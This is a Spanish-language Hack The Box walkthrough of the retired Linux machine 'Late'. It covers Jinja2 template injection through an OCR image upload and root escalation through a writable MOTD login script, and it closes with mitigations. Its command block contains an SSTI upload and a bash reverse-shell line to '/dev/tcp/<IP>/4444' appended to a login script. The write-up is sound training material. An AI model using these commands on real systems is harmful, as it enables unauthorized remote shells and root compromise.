---
machine: Late
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, ssti, jinja2, ocr, login-script]
---

# Late — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un sitio de OCR renderiza el texto reconocido con Jinja2 y es vulnerable a SSTI. Una imagen con una expresión bien formateada devuelve la ejecución. La escalada aprovecha permiso de escritura para añadir una línea a un script que se ejecuta al iniciar sesión y se dispara con SSH.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
ffuf -u http://late.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Imagen con texto Jinja2
convert -size 800x200 xc:white -pointsize 40 -annotate +20+100 '{{7*7}}' test.png
curl -F "image=@test.png" http://late.htb/upload
# SSTI
curl -F "image=@payload.png" http://late.htb/upload
# Script de login
ls -la /etc/update-motd.d/
echo 'bash -i >& /dev/tcp/<IP>/4444 0>&1' >> /etc/update-motd.d/00-header
ssh <USER>@<IP>
```

## Enumeración

- Sitio de OCR que recibe imágenes y muestra el texto.
- Renderizado Jinja2 del texto sin escapar.
- Script de login con permisos de escritura para el usuario.

## Acceso inicial

Se sube una imagen que contiene una expresión Jinja2 legible por el OCR. El servidor la renderiza y ejecuta el payload, devolviendo una shell como el usuario de la aplicación.

## Escalada de privilegios

Se revisan scripts de login o MOTD y se comprueba que el usuario puede añadir líneas. Se agrega un comando que lanza una shell y se abre una nueva sesión SSH para que el script se ejecute como root.

## Evidencia

- Imagen con `{{7*7}}` renderizada como `49`.
- Payload de SSTI con callback de shell.
- Línea añadida al script de login y shell de root.

## Lecciones aprendidas

- El OCR no es una frontera de confianza para plantillas.
- Un script de login escribible es persistencia y escalada.
- Los permisos de grupo pueden permitir append sin editar.

## Mitigación y detección

- Renderizar el texto como dato, no como plantilla.
- Montar scripts de login como solo lectura.
- Auditar permisos de grupos sobre `/etc` y MOTD.

## Referencias

- [0xdf — Late](https://0xdf.gitlab.io/2022/07/30/htb-late.html)
- [Jinja2 — Template Designer](https://jinja.palletsprojects.com/en/stable/templates/)
- [Hack The Box — Late](https://app.hackthebox.com/machines/late)
